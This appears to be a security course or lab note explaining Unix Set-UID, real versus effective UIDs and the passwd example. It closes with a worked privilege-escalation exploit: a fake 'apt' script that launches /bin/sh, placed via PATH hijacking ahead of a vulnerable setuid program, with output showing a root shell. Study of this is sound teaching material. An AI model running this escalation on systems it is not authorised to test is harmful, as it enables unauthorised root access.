Set-UID Concept
• Allow user to run a program with the program owner’s privilege.\
• Allow users to run programs with temporary elevated privileges\
• Example: the passwd program\
$ ls -l /usr/bin/passwd\
-rwsr-xr-x 1 root root 41284 Sep 12 2012 /usr/bin/passwd
Every process has two User IDs.\
• Real UID (RUID): Identifies real owner of process\
• Effective UID (EUID): Identifies privilege of a process\
• Access control is based on EUID\
• When a normal program is executed, RUID = EUID, they both equal\
to the ID of the user who runs the program\
• When a Set-UID is executed, RUID ≠ EUID. RUID still equal to the\
user’s ID, but EUID equals to the program owner’s ID.\
Setuid is a Unix access rights flag that allow users to run an executable with the file system permissions of the executable’s owner.

![image](https://user-images.githubusercontent.com/70282840/194762130-00d2b17f-72be-4cac-bd4c-24a7541e9761.png)

**Exploiting a setuid executable**
 Use file attached
 
```$ mkdir /tmp/foo # create random directory to put the script

$ echo /bin/sh > /tmp/foo/apt # create the script that will launch /bin/sh

$ chmod 755 /tmp/foo/apt # mark it as executable

$ PATH=/tmp/foo:$PATH /usr/local/bin/apt-updater # override the PATH variable to that it contains /tmp/foo directory & execute the vulnerable program

id # we are root!

uid=0(root) gid=1001(creekorful) groups=1001(creekorful)
